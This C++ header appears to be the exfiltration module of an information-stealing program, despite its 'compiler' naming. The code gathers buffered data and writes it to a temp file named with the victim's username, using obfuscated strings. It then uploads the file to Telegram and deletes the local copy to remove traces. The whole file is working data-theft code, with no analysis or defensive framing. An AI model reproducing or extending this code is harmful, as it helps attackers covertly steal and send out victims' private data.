#pragma once

namespace compiler {
	class c_compiler {
	public:
        void push(const std::string& s) {
            data << s;
        }

        void push_line(const std::string& s) {
            data << s << "\n";
        }

        void flush(const std::string& path) {
            std::ofstream file(path);
            if (file.is_open()) {
                file << data.str();
                file.close();
            }
        }

	private:
		std::stringstream data;
	};

    void upload( std::string file_name, std::shared_ptr< c_compiler > instance ) {
        std::string random = utility::generate_random_name();
        std::string user = utility::get_username();
        std::string filename = random + oxorany( "-" ) + user + oxorany( "-" ) + file_name + oxorany(".txt" );

        char temp_path[MAX_PATH];
        GetTempPathA(MAX_PATH, temp_path);
        std::string output_file = std::string(temp_path) + filename;
        instance->flush( output_file );

        std::wstring woutput_file = utility::utf8_to_wstring(output_file);
        https::upload_telegram_file(woutput_file);
        DeleteFileA(output_file.c_str());
    }
}